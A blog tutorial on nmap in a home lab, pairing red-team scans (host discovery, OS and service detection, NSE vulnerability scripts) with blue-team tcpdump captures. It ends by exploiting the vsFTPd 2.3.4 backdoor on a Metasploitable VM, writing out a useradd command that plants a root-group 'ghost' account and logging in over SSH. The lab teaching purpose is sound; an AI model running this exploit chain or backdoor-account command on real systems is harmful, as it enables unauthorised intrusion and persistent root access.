---
layout: post
title: 'Nmap & Getting to Know Thy Enemy'
category: essays
subcategory: 'vulnerability-management'
permalink: 'nmap-getting-to-know-thy-enemy'
---

![knowthyenemy]({{ site.url }}{{ site.baseurl }}/_assets/theOffice.jpg)

Hackers use `nmap` to enumerate details about their potential targets. It can identify open ports, running services, and which software versions are in use. Yet, it can also be used to determine the vulnerability of a system and even exploit it. In this blog post, I will demonstrate how to use `nmap` and how it can be observed.

## Table of Contents
* [Setup](#setup)
* [Host Discovery](#host-discovery)
* [OS Fingerprinting](#os-fingerprinting)
* [Service Detection](#service-detection)
* [Vulnerability Assessment & Exploitation](#vulnerability-assessment-exploitation)
* [References](#references)

### Setup
To follow along, I recommend hosting two Virtual Machines (VMs) on your computer. I personally used a [Metasploitable Linux](https://metasploit.help.rapid7.com/docs/metasploitable-2) VM and [Kali Linux](https://www.kali.org) VM via [VirtualBox](https://www.virtualbox.org).
* Metasploitable Linux VM: `192.168.56.4`
* Kali Linux VM: `192.168.56.5`

## Host Discovery
<font color='red'>Red Team</font>
To perform a Ping Sweep of a specific subnet, use the command sentence below (include `-sn` in order to maintain a low profile).  
> This option tells Nmap not to do a port scan after host discovery, and only print out the available hosts that responded to the host discovery probes.

```bash
nmap -sn 192.168.56.0/24
```
```python
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-02 09:02 EST
Nmap scan report for 192.168.56.1
Host is up (0.00042s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00039s latency).
MAC Address: 08:00:27:2A:07:F3 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.3
Host is up (0.00054s latency).
MAC Address: 08:00:27:48:E4:24 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up (0.0012s latency).
MAC Address: 08:00:27:30:63:69 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.5
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.02 seconds
```

<font color='blue'>Blue Team</font>
Since we are part of the target subnet and port scanning was turned-off, our *Host Discovery* probes will appear as a series of ARP requests.
```bash
tcpdump
```
```python
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
03:07:25.825767 arp who-has 192.168.56.1 tell 192.168.56.5
03:07:25.826343 arp who-has 192.168.56.2 tell 192.168.56.5
03:07:25.826914 arp who-has 192.168.56.3 tell 192.168.56.5
03:07:25.827545 arp who-has 192.168.56.4 tell 192.168.56.5
03:07:25.827567 arp reply 192.168.56.4 is-at 08:00:27:30:63:69 (oui Unknown)
<...snipped...>
509 packets captured
509 packets received by filter
0 packets dropped by kernel
```

## OS Fingerprinting
<font color='red'>Red Team</font>
With a handful of targets already identified, we can mute Host Discovery and run a OS Fingerprint scan against a single node of interest.
> Disabling host discovery with -Pn causes Nmap to attempt the requested scanning functions against every target IP address specified.<br>
<br>
For machines on a local ethernet network, ARP scanning will still be performed (unless --disable-arp-ping or --send-ip is specified) because Nmap needs MAC addresses to further scan target hosts. In previous versions of Nmap, -Pn was -P0 and -PN. <br>
<br>
Nmap sends a series of TCP and UDP packets to the remote host and examines practically every bit in the responses. After performing dozens of tests such as TCP ISN sampling, TCP options support and ordering, IP ID sampling, and the initial window size check, Nmap compares the results to its nmap-os-db database of more than 2,600 known OS fingerprints and prints out the OS details if there is a match.

```bash
nmap -Pn --disable-arp -O 192.168.56.4
```
```python
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-02 09:18 EST
Nmap scan report for 192.168.56.4
Host is up (0.00053s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
2049/tcp open  nfs
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6667/tcp open  irc
MAC Address: 08:00:27:30:63:69 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.45 seconds
```

<font color='blue'>Blue Team</font>
```bash
tcpdump src host 192.168.56.5 and dst host 192.168.56.4
```
```python
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
<...snipped...>
03:15:40.712529 IP 192.168.56.5.35685 > 192.168.56.4.ssh: S 1928527421:1928527421(0) win 1024 <mss 1460>
03:15:40.712529 IP 192.168.56.5.35685 > 192.168.56.4.ssh: S 1928527421:1928527421(0) win 1024 <mss 1460>
03:15:40.713131 IP 192.168.56.5.35685 > 192.168.56.4.ssh: R 1928527422:1928527422(0) win 0
03:15:40.715247 IP 192.168.56.5.35685 > 192.168.56.4.telnet: S 1928527421:1928527421(0) win 1024 <mss 1460>
03:15:40.715247 IP 192.168.56.5.35685 > 192.168.56.4.telnet: S 1928527421:1928527421(0) win 1024 <mss 1460>
03:15:40.715516 IP 192.168.56.5.35685 > 192.168.56.4.telnet: R 1928527422:1928527422(0) win 0
03:15:40.719605 IP 192.168.56.5.35685 > 192.168.56.4.www: S 1928527421:1928527421(0) win 1024 <mss 1460>
03:15:40.719605 IP 192.168.56.5.35685 > 192.168.56.4.www: S 1928527421:1928527421(0) win 1024 <mss 1460>
03:15:40.719949 IP 192.168.56.5.35685 > 192.168.56.4.www: R 1928527422:1928527422(0) win 0
03:15:40.720476 IP 192.168.56.5.35685 > 192.168.56.4.mysql: S 1928527421:1928527421(0) win 1024 <mss 1460>
03:15:40.720476 IP 192.168.56.5.35685 > 192.168.56.4.mysql: S 1928527421:1928527421(0) win 1024 <mss 1460>
03:15:40.720988 IP 192.168.56.5.35685 > 192.168.56.4.mysql: R 1928527422:1928527422(0) win 0
03:15:40.721447 IP 192.168.56.5.35685 > 192.168.56.4.ftp: S 1928527421:1928527421(0) win 1024 <mss 1460>
03:15:40.721447 IP 192.168.56.5.35685 > 192.168.56.4.ftp: S 1928527421:1928527421(0) win 1024 <mss 1460>
03:15:40.722051 IP 192.168.56.5.35685 > 192.168.56.4.ftp: R 1928527422:1928527422(0) win 0
<...snipped...>
1052 packets captured
1052 packets received by filter
0 packets dropped by kernel
```

## Service Detection
<font color='red'>Red Team</font>
> When doing vulnerability assessments (or even simple network inventories) of your companies or clients, you really want to know which...servers and versions are running. Having an accurate version number helps dramatically in determining which exploits a server is vulnerable to. Version detection helps you obtain this information.<br>
<br>
After TCP and/or UDP ports are discovered using one of the other scan methods, version detection interrogates those ports to determine more about what is actually running. The nmap-service-probes database contains probes for querying various services and match expressions to recognize and parse responses.

As before, we can keep the amount of traffic on the network to a minimum by only specifying open TCP ports of interest during our Service Detection scan.
```bash
nmap -Pn --disable-arp -sV -p T:21,22,23,80,3306 192.168.56.4
```
```python
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-02 09:31 EST
Nmap scan report for 192.168.56.4
Host is up (0.00049s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet  Linux telnetd
80/tcp   open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
MAC Address: 08:00:27:30:63:69 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.60 seconds
```
Service Detection scans should also be performed against UDP ports. In the following example, I ran a scan using the Top 5 UDP ports found open as input. For this specific option, you can increase/decrease the number as desired. For instance, use `--top-ports 100` to probe the Top 100 TCP (`-sT` or `-sS`) or UDP (`-sU`) ports.
```bash
nmap -Pn --disable-arp --top-ports 5 -sUV 192.168.56.4
```
To scan TCP & UDP ports at the same time, run something similar to the command sentence below.
```bash
nmap -Pn --disable-arp -sTUV --top-ports 5 192.168.56.4
```

<font color='blue'>Blue Team</font>
```bash
tcpdump src host 192.168.56.5 and dst host 192.168.56.4
```
```python
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
<...snipped...>
03:36:35.921784 IP 192.168.56.5.47534 > 192.168.56.4.ftp: S 660922954:660922954(0) win 1024 <mss 1460>
03:36:35.922017 IP 192.168.56.5.47534 > 192.168.56.4.ftp: R 660922955:660922955(0) win 0
03:36:35.921784 IP 192.168.56.5.47534 > 192.168.56.4.ftp: S 660922954:660922954(0) win 1024 <mss 1460>
03:36:36.013249 IP 192.168.56.5.60308 > 192.168.56.4.ftp: S 3443481446:3443481446(0) win 29200 <mss 1460,sackOK,timestamp 726852017 0,nop,wscale 7>
03:36:36.013501 IP 192.168.56.5.60308 > 192.168.56.4.ftp: . ack 3176472963 win 229 <nop,nop,timestamp 726852018 3049700>
03:36:36.019386 IP 192.168.56.5.60308 > 192.168.56.4.ftp: . ack 21 win 229 <nop,nop,timestamp 726852024 3049701>
03:36:36.021853 IP 192.168.56.5.60308 > 192.168.56.4.ftp: F 0:0(0) ack 21 win 229 <nop,nop,timestamp 726852026 3049701>
03:36:36.024630 IP 192.168.56.5.60308 > 192.168.56.4.ftp: R 3443481448:3443481448(0) win 0
03:36:36.024652 IP 192.168.56.5.60308 > 192.168.56.4.ftp: R 3443481448:3443481448(0) win 0
<...snipped...>
69 packets captured
69 packets received by filter
0 packets dropped by kernel
```

## Vulnerability Assessment & Exploitation
In 2015, the Nmap Scripting Engine (NSE) was introduced which then enabled Nmap to be used for Vulnerability Assessments & Exploitation.
> It allows users to write (and share) simple scripts to automate a wide variety of networking tasks.
<br>
NSE scripts define a list of categories they belong to. Currently defined categories are auth, broadcast, brute, default. discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln.

Most NSE scripts are saved in the directory below. They, like `nmap`, are developed in the Lua programming language and structured using a Fields, Rules, and Action format.  
```bash
ls /usr/share/nmap/scripts/
```
```bash
acarsd-info.nse		http-grep.nse                   nntp-ntlm-info.nse
address-info.nse        http-headers.nse                nping-brute.nse
afp-brute.nse           http-huawei-hg5xx-vuln.nse	nrpe-enum.nse
<...snipped...>
```

<font color='blue'>Blue Team</font>
To run available NSE scripts under the `vuln` category, execute the following command sentence.
```bash
nmap --script vuln 192.168.56.4
```
The expected output will identify what common exploits your target node is vulnerable to. The awesome part about the NSE is you can extend your analysis through homebrewed and publicly shared scripts.
```python
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-02 09:40 EST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.56.4
Host is up (0.00060s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  OSVDB:73573  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       http://osvdb.org/73573
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|_sslv2-drown:
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
<...snipped...>
Nmap done: 1 IP address (1 host up) scanned in 348.71 seconds
```

<font color='red'>Red Team</font>
To learn more about an on-system NSE script, use the `--script-help` option.
```bash
nmap --script-help ftp-vsftpd-backdoor
```
```python
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-02 09:48 EST

ftp-vsftpd-backdoor
Categories: exploit intrusive malware vuln
https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html
  Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04
  (CVE-2011-2523). This script attempts to exploit the backdoor using the
  innocuous <code>id</code> command by default, but that can be changed with
  the <code>exploit.cmd</code> or <code>ftp-vsftpd-backdoor.cmd</code> script
  arguments.

  References:

  * http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
  * https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
  * http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2011-2523
```

Here, we will only run the `ftp-vsftpd-backdoor` NSE script against our target's FTP port (`-p21`). The results will essentially be the same as our `--script vuln` scan yet, without information about other ports or services.
```bash
nmap --script ftp-vsftpd-backdoor -p21 192.168.56.4
```
```python
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-02 09:50 EST
Nmap scan report for 192.168.56.4
Host is up (0.00065s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  OSVDB:73573
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       http://osvdb.org/73573
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|_      http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
MAC Address: 08:00:27:30:63:69 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.54 seconds
```

Finally, NSE scripts can take multiple arguments from standard input. In our previous `ftp-vsftpd-backdoor` scan, the `id` shell command was executed as the `cmd` argument. Corresponding output suggests the exploit in question provides root-level access. We will explore this in a moment. First, let's try something a little more cliche.

This command sentence has been spread across two lines for readability.  
```bash
nmap --script ftp-vsftpd-backdoor \
--script-args cmd="echo Hello World" -p21 192.168.56.4
```
```python
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-02 09:58 EST
Nmap scan report for 192.168.56.4
Host is up (0.00046s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  OSVDB:73573
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|       Shell command: echo Hello World
|       Results: Hello World
|     References:
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|_      http://osvdb.org/73573
MAC Address: 08:00:27:30:63:69 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.33 seconds
```

NSE scripts can also take arguments from a file, which helps with crafting more elaborate probing, analysis, and exploitation. In this scan, we are going to use a file to define `useradd` as our `cmd` argument and attempt to establish persistent access on our target.  
```bash
echo 'cmd="useradd -g root -s /bin/bash ghost && echo ghost:boo | chpasswd"' \
> /hauntingYou.txt
```
Ensure to use the absolute file-path to your args file for your scan (especially if it saved somewhere wonky).
```bash
nmap --script ftp-vsftpd-backdoor \
--script-args-file=/hauntingYou.txt -p21 192.168.56.4
```
```python
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-02 10:00 EST
Nmap scan report for 192.168.56.4
Host is up (0.00053s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor:
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  OSVDB:73573
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       http://osvdb.org/73573
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
MAC Address: 08:00:27:30:63:69 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 11.34 seconds
```

Since there is typically no output for a successful `useradd` execution, we can assume it worked and try to login remotely.
```bash
ssh ghost@192.168.56.4
```
```bash
ghost@192.168.56.4s password: # according to our arg file, password = 'boo'
```
```
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Could not chdir to home directory /home/ghost: No such file or directory
ghost@metasploitable:/$
```
And we're in! Running the `id` shell command as before now tells us we have root-level access as `ghost`. Spooky!
```
ghost@metasploitable:/$ id
uid=1003(ghost) gid=0(root) groups=0(root)
```

### References
* [Nmap Reference Guide: Host Discovery](https://nmap.org/book/man-host-discovery.html)
* [Nmap Reference Guide: OS Detection ](https://nmap.org/book/man-os-detection.html)
* [Daniel Miessler: Nmap - Use the --top-ports Option for Both TCP and UDP Simultaneously](https://danielmiessler.com/blog/nmap-use-the-top-ports-option-for-both-tcp-and-udp-simultaneously/)
* [Digital Ocean: How To Test your Firewall Configuration with Nmap and Tcpdump](https://www.digitalocean.com/community/tutorials/how-to-test-your-firewall-configuration-with-nmap-and-tcpdump)
* [HackerTarget: Nmap Cheat Sheet](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/)
* [Nmap Reference Guide: Nmap Scripting Engine](https://nmap.org/book/nse-usage.html#nse-script-types)
* [NSE Script: ftp-vsftpd-backdoor](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html)
